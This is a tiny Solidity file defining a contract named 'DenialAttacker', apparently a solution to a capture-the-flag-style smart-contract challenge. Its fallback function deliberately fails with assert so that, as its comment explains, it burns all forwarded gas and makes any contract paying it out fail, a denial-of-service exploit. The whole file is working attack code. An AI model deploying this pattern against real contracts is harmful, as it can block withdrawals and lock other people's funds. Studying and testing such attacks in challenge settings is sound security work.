// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DenialAttacker {
    fallback() external payable {
        // an assert consumes all transaction gas, unlike a
        //revert which returns the remaining gas
        assert(1 == 2);
    }
}